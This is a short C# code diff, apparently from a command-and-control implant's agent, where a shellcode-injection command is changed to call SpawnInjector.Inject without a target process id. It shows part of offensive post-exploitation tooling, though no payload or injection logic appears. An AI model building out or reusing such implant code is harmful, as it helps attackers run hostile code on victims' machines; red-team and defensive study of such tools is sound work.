@@ -19,7 +19,7 @@ namespace Agent.Commands
 
 
             var injector = new SpawnInjector();
-            var success = injector.Inject(task.FileBytes, pid);
+            var success = injector.Inject(task.FileBytes);
 
             if (success) return "Shellcode injected";
             else return "Failed to inject shellcode";
